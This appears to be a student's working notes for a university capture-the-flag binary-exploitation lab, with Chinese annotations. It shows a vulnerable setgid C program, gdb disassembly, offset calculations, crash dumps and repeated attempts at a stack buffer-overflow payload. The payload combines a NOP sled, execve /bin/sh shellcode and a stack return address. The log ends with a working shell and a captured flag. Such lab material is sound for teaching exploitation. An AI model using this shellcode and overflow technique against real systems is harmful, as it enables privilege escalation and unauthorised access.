Connect to bin.chall.necst.it port 22 via SSH as user m918111. You will find the files in /home/m918111/mission1.

Your goal is to read the file flag with the privileges of the group that owns the vulnerable binary.

The executable program is compiled with: gcc -m32 -no-pie -fno-stack-protector -z execstack -o mission1 mission1.c

=================================================================================================================
// gcc mycowsay.c -o mycowsay -m32 -z execstack -fno-stack-protector
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char snake[] = " <1>                \n"
             " <2>\n"
             " <3>\n"
             " \\\\     // =====\\\\\n"  
             "  \\\\   //        \\\\\n"
             "    ===           \\===C:>\n";



int say_buf(char *say){
    int ret = 0;
    char buffer[sizeof(snake)];

    memcpy(buffer, snake, strlen(snake));  #把snake拷贝到buffer中 
    memcpy(strchr(buffer, '<') + 2, say, strlen(say)); #把say拷贝到<1>后面

    printf("%s\n", buffer);
    return ret;
}

'''
函数原型
void *memcpy(void *destin, void *source, unsigned n);
参数
destin-- 指向用于存储复制内容的目标数组，类型强制转换为 void* 指针。
source-- 指向要复制的数据源，类型强制转换为 void* 指针。
n-- 要被复制的字节数。
返回值
该函数返回一个指向目标存储区destin的指针。
功能
从源source所指的内存地址的起始位置开始拷贝n个字节到目标destin所指的内存地址的起始位置中。
'''
函数原型
char *strchr(const char *str, int c)
参数
str-- 要被检索的 C 字符串。
c-- 在 str 中要搜索的字符。
功能
在参数str所指向的字符串中搜索第一次出现字符c（一个无符号字符）的位置。
返回一个指向该字符串中第一次出现的字符的指针，如果字符串中不包含该字符则返回NULL空指针。

int main(int argc, char *argv[]){
    if (argc <= 1){
        say_buf("Hey, wanna ssssslither?");
    } else {
        say_buf(argv[1]);
    }
    exit(0);
}
===================================================================================================================

$ ls
mission0  mission1

$ cd mission1
$ ls -l
total 20
-r--r----- 1 root    lev1      20 May  5 08:08 flag
-r-xr-sr-x 1 nobody  lev1    7696 May  5 08:08 mission1
-rw-r--r-- 1 m918111 m918111  722 May  5 08:08 mission1.c
drwxr-xr-x 2 m918111 root    4096 May  5 08:08 writable

>>> gdb mission1

(gdb) disassemble main
Dump of assembler code for function main:
   0x08048549 <+0>:	lea    0x4(%esp),%ecx
   0x0804854d <+4>:	and    $0xfffffff0,%esp
   0x08048550 <+7>:	pushl  -0x4(%ecx)
   0x08048553 <+10>:	push   %ebp
   0x08048554 <+11>:	mov    %esp,%ebp
   0x08048556 <+13>:	push   %ecx
   0x08048557 <+14>:	sub    $0x4,%esp
   0x0804855a <+17>:	mov    %ecx,%eax
   0x0804855c <+19>:	cmpl   $0x1,(%eax)
   0x0804855f <+22>:	jg     0x8048573 <main+42>
   0x08048561 <+24>:	sub    $0xc,%esp
   0x08048564 <+27>:	push   $0x8048620
   0x08048569 <+32>:	call   0x80484cb <say_buf>
   0x0804856e <+37>:	add    $0x10,%esp
   0x08048571 <+40>:	jmp    0x8048587 <main+62>
   0x08048573 <+42>:	mov    0x4(%eax),%eax
   0x08048576 <+45>:	add    $0x4,%eax
   0x08048579 <+48>:	mov    (%eax),%eax
   0x0804857b <+50>:	sub    $0xc,%esp
   0x0804857e <+53>:	push   %eax
   0x0804857f <+54>:	call   0x80484cb <say_buf>
   0x08048584 <+59>:	add    $0x10,%esp
   0x08048587 <+62>:	sub    $0xc,%esp
   0x0804858a <+65>:	push   $0x0
   0x0804858c <+67>:	call   0x8048380 <exit@plt>
End of assembler dump.

(gdb) disassemble say_buf
Dump of assembler code for function say_buf:
   0x080484cb <+0>:	push   %ebp
   0x080484cc <+1>:	mov    %esp,%ebp
   0x080484ce <+3>:	push   %ebx
   0x080484cf <+4>:	sub    $0x74,%esp     #+++++++++++++++++++++++++x74=116+++++++++
   0x080484d2 <+7>:	movl   $0x0,-0xc(%ebp)
   0x080484d9 <+14>:	sub    $0xc,%esp
   0x080484dc <+17>:	push   $0x804a060
   0x080484e1 <+22>:	call   0x80483a0 <strlen@plt>
   0x080484e6 <+27>:	add    $0x10,%esp
   0x080484e9 <+30>:	sub    $0x4,%esp
   0x080484ec <+33>:	push   %eax
   0x080484ed <+34>:	push   $0x804a060
   0x080484f2 <+39>:	lea    -0x6d(%ebp),%eax         ====================
   0x080484f5 <+42>:	push   %eax
   0x080484f6 <+43>:	call   0x8048360 <memcpy@plt>
   0x080484fb <+48>:	add    $0x10,%esp
   0x080484fe <+51>:	sub    $0xc,%esp
   0x08048501 <+54>:	pushl  0x8(%ebp)
   0x08048504 <+57>:	call   0x80483a0 <strlen@plt>
   0x08048509 <+62>:	add    $0x10,%esp
   0x0804850c <+65>:	mov    %eax,%ebx
   0x0804850e <+67>:	sub    $0x8,%esp
   0x08048511 <+70>:	push   $0x3c
   0x08048513 <+72>:	lea    -0x6d(%ebp),%eax
   0x08048516 <+75>:	push   %eax
   0x08048517 <+76>:	call   0x8048390 <strchr@plt>
   0x0804851c <+81>:	add    $0x10,%esp
   0x0804851f <+84>:	add    $0x2,%eax
   0x08048522 <+87>:	sub    $0x4,%esp
   0x08048525 <+90>:	push   %ebx
   0x08048526 <+91>:	pushl  0x8(%ebp)
   0x08048529 <+94>:	push   %eax
   0x0804852a <+95>:	call   0x8048360 <memcpy@plt>
   0x0804852f <+100>:	add    $0x10,%esp
   0x08048532 <+103>:	sub    $0xc,%esp
   0x08048535 <+106>:	lea    -0x6d(%ebp),%eax
   0x08048538 <+109>:	push   %eax
   0x08048539 <+110>:	call   0x8048370 <puts@plt>
   0x0804853e <+115>:	add    $0x10,%esp
   0x08048541 <+118>:	mov    -0xc(%ebp),%eax
   0x08048544 <+121>:	mov    -0x4(%ebp),%ebx
   0x08048547 <+124>:	leave
   0x08048548 <+125>:	ret
End of assembler dump.
===============================================================================================================================================================================================
一共116个空间 前面<1 剩余112 ebp + eip 一共8个 剩余 106

pwndbg> run $(perl -e 'print "A"x106 . "BBBBCCCC" ')
Starting program: /home/m918111/mission1/mission1 $(perl -e 'print "A"x106 . "BBBBCCCC" ')
 <1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC������������܃�� ���

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────────────────
 EAX  0x41414141 ('AAAA')
 EBX  0x41414141 ('AAAA')
 ECX  0xffffffff
 EDX  0xf7fc9870 (_IO_stdfile_1_lock) ◂— 0
 EDI  0xf7fc8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 ESI  0xf7fc8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 EBP  0x42424242 ('BBBB')
 ESP  0xffffc4f0 —▸ 0xffffc71f ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC'
 EIP  0x43434343 ('CCCC')
───────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────────────────
Invalid address 0x43434343



───────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp  0xffffc4f0 —▸ 0xffffc71f ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC'
01:0004│      0xffffc4f4 —▸ 0xffffc5b4 —▸ 0xffffc6ff ◂— '/home/m918111/mission1/mission1'
02:0008│      0xffffc4f8 —▸ 0xffffc5c0 —▸ 0xffffc792 ◂— 'XDG_SESSION_ID=c10071'
03:000c│      0xffffc4fc —▸ 0x80485c1 (__libc_csu_init+33) ◂— lea    eax, [ebx - 0xf8]
04:0010│      0xffffc500 —▸ 0xf7fc83dc (__exit_funcs) —▸ 0xf7fc91e0 (initial) ◂— 0
05:0014│      0xffffc504 —▸ 0xffffc520 ◂— 0x2
06:0018│      0xffffc508 ◂— 0x0
07:001c│      0xffffc50c —▸ 0xf7e2e637 (__libc_start_main+247) ◂— add    esp, 0x10
─────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0 43434343
Program received signal SIGSEGV (fault address 0x43434343)


shellcode 25个 116 -25 =91   91-20 =71
r $(perl -e 'print "\x90"x71 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" . "EEEE"x5 '）


pwndbg> x/100x $esp-200
0xffffc428:	0x0000008d	0xf7ffdc08	0xf7fe77eb	0xf7e15700
0xffffc438:	0x00000000	0xf7fc8d60	0xffffc4e8	0xf7fee010
0xffffc448:	0xf7e75cab	0x00000074	0xf7fc8000	0xf7fc8000
0xffffc458:	0xffffc4e8	0x0804853e	0xffffc47b	0xffffc71d
0xffffc468:	0x00000074	0x00000001	0x00000000	0x00000001

0xffffc478:	0x20ffd918	0x9090313c	0x90909090	0x90909090
0xffffc488:	0x90909090	0x90909090	0x90909090	0x90909090

0xffffc498:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffc4a8:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffc4b8:	0x90909090	0x90909090	0x90909090	0x50c03190
0xffffc4c8:	0x732f2f68	0x622f6868	0xe3896e69	0x53e28950
0xffffc4d8:	0x0bb0e189	0x454580cd	0x45454545	0x45454545
0xffffc4e8:	0x45454545	0x45454545	0xffff4545	0xffffc5b4

0xffffc4f8:	0xffffc5c0	0x080485c1	0xf7fc83dc	0xffffc520
0xffffc508:	0x00000000	0xf7e2e637	0xf7fc8000	0xf7fc8000
0xffffc518:	0x00000000	0xf7e2e637	0x00000002	0xffffc5b4
0xffffc528:	0xffffc5c0	0x00000000	0x00000000	0x00000000
0xffffc538:	0xf7fc8000	0xf7ffdc04	0xf7ffd000	0x00000000
0xffffc548:	0xf7fc8000	0xf7fc8000	0x00000000	0x2240852c
0xffffc558:	0x18012b3c	0x00000000	0x00000000	0x00000000
0xffffc568:	0x00000002	0x080483d0	0x00000000	0xf7fee010
0xffffc578:	0xf7fe8880	0xf7ffd000	0x00000002	0x080483d0
0xffffc588:	0x00000000	0x080483f1	0x08048549	0x00000002
0xffffc598:	0xffffc5b4	0x080485a0	0x08048600	0xf7fe8880
0xffffc5a8:	0xffffc5ac	0xf7ffd918	0x00000002	0xffffc6fd

ffffc498====> \x98\xc4\xff\xff
r $(perl -e 'print "\x90"x71 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" . "\x98\xc4\xff\xff"x5 '）
失败 发现EBP EIP不对

Program received signal SIGSEGV (fault address 0xc4a8ffff)
pwndbg> r $(perl -e 'print "\x90"x71 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" . "ABCD"x5')
Starting program: /home/m918111/mission1/mission1 $(perl -e 'print "\x90"x71 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" . "ABCD"x5')
 <1�����������������������������������������������������������������������1�Ph//shh/bin��P��S��
                                                                                                ̀ABCDABCDABCDABCDABCD�����������܃�� ���

Program received signal SIGSEGV, Segmentation fault.
0x42414443 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────────────────
 EAX  0x424180cd
 EBX  0x42414443 ('CDAB')
 ECX  0xffffffff
 EDX  0xf7fc9870 (_IO_stdfile_1_lock) ◂— 0
 EDI  0xf7fc8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 ESI  0xf7fc8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 EBP  0x42414443 ('CDAB')    #++++++++++++++++++++++++++++++++++++++++
 ESP  0xffffc4f0 —▸ 0xffff4443 ◂— 0x0
 EIP  0x42414443 ('CDAB')
───────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────────────────
Invalid address 0x42414443










───────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp  0xffffc4f0 —▸ 0xffff4443 ◂— 0x0
01:0004│      0xffffc4f4 —▸ 0xffffc5b4 —▸ 0xffffc6fd ◂— '/home/m918111/mission1/mission1'
02:0008│      0xffffc4f8 —▸ 0xffffc5c0 —▸ 0xffffc792 ◂— 'XDG_SESSION_ID=c10071'
03:000c│      0xffffc4fc —▸ 0x80485c1 (__libc_csu_init+33) ◂— lea    eax, [ebx - 0xf8]
04:0010│      0xffffc500 —▸ 0xf7fc83dc (__exit_funcs) —▸ 0xf7fc91e0 (initial) ◂— 0
05:0014│      0xffffc504 —▸ 0xffffc520 ◂— 0x2
06:0018│      0xffffc508 ◂— 0x0
07:001c│      0xffffc50c —▸ 0xf7e2e637 (__libc_start_main+247) ◂— add    esp, 0x10
─────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0 42414443
Program received signal SIGSEGV (fault address 0x42414443)



r $(perl -e 'print "\x90"x87 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" . "\x98\xc4\xff\xff" '）



修改后 +nop
pwndbg> r $(perl -e 'print "\x90"x61 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" . "\x90"x20 . "\x98\xc4\xff\xff"x2 ')
Starting program: /home/m918111/mission1/mission1 $(perl -e 'print "\x90"x61 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" . "\x90"x20 . "\x98\xc4\xff\xff"x2 ')
 <1�������������������������������������������������������������1�Ph//shh/bin��P��S��
                                                                                      ̀����������������������������������������܃�� ���
process 11455 is executing new program: /bin/dash
$


./mission1 $(perl -e 'print "\x90"x61 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" . "\x90"x20 . "\x98\xc4\xff\xff"x2 ')
$(perl -e 'print "\x90"x61 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" . "\x90"x20 . "\x98\xc4\xff\xff"x2 ')



m918111@bin:~/mission1$ ./mission1 $(perl -e 'print "\x90"x61 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" . "\x90"x20 . "\x98\xc4\xff\xff"x2 ')
 <1�������������������������������������������������������������1�Ph//shh/bin��P��S��
                                                                                      ̀����������������������������6�������
Illegal instruction (core dumped)


出现非法语句

 $(perl -e 'print "\x90"x31 . "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x58\x58\x58\x58\x59\x59\x59\x59" . "\x90"x20 . "\x88\xc4\xff\xff"x2')

xor    %eax,%eax
push   %eax
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
push   %eax
push   %ebx
mov    %esp,%ecx
mov    $0xb,%al
int    $0x80

 "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"===23

 $(perl -e 'print "\x90"x63 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" . "\x90"x20 . "EEEE"x2')

 $(perl -e 'print "\x90"x78 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" . "EEEEEEEE" ')



 process 29519 is executing new program: /bin/dash
Error in re-setting breakpoint 1: Function "say_buf" not defined.
$ cat flag
[New process 29690]
process 29690 is executing new program: /bin/cat
cat: flag: Permission denied
$ [Inferior 2 (process 29690) exited with code 01]

[4]+  Stopped                 gdb mission1
m918111@bin:~/mission1$ ./mission1  $(perl -e 'print "\x90"x78 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" . "\xc8\xc4\xff\xff"x2 ')
 <1������������������������������������������������������������������������������1�Ph//shh/bin����°
                                                                                                    ̀1�@̀��������6�������
$ cat flag
ymRMbeivlfmmrbeqriJM$